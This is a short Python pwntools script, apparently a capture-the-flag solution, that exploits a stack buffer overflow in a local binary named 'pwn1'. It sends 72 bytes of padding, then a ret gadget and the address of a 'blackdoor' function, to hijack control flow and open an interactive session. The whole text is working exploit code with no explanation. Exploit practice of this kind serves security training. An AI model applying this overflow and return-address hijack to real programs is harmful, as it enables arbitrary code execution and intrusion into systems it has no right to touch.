from pwn import *
# 64
p=process('./pwn1')
ret_addr=0x000000000040101a
blackdoor_addr=0x00000000004017B5
payload=b'a'*(64+8)+p64(ret_addr)+p64(blackdoor_addr)

p.sendlineafter("name: ",payload)
p.interactive()
